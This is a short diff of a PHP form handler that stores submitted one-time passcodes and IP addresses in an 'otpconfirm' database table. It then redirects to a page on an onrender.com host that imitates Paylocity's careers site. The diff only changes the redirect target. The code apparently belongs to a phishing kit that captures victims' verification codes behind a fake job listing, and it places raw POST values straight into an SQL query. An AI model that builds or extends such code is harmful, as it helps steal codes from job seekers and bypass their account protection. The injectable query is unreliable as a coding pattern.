@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"]=="POST"){
     $query = "INSERT INTO otpconfirm (otpconfirm,time,ip) VALUES ('$_POST[otpconfirm]',NOW(),'$_POST[ip]')";
     $result = pg_query($query);
 
- header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/verification_processing.html");
+ header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/processing.html");
 
 exit; 
 }
